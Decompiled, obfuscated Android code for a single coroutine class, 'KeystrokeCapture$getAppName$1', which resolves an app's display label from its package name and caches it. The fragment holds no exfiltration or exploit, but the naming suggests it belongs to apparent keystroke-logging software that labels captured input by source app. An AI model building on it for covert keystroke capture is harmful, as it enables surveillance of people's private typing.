package com.storm.safe.rock.service.modules;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.KeystrokeCapture$getAppName$1", m214403f = "KeystrokeCapture.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class KeystrokeCapture$getAppName$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0320a5 f52774a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f52775a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52776a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public KeystrokeCapture$getAppName$1(C0320a5 c0320a5, String str, String str2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52774a1 = c0320a5;
        this.f52775a2 = str;
        this.f52776a3 = str2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new KeystrokeCapture$getAppName$1(this.f52774a1, this.f52775a2, this.f52776a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        KeystrokeCapture$getAppName$1 keystrokeCapture$getAppName$1 = (KeystrokeCapture$getAppName$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        keystrokeCapture$getAppName$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str = this.f52775a2;
        C0320a5 c0320a5 = this.f52774a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            PackageManager packageManager = c0320a5.f53077a0.getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(str, 0);
            t60.m214694b5(applicationInfo, "pm.getApplicationInfo(packageName, 0)");
            String string = packageManager.getApplicationLabel(applicationInfo).toString();
            c0320a5.f53081a4.put(str, string);
            c0320a5.f53077a0.getSharedPreferences("app_name_cache", 0).edit().putString(str, string).apply();
        } catch (Exception unused) {
            c0320a5.f53081a4.put(str, this.f52776a3);
        }
        return C1351vv.f60710b1;
    }
}
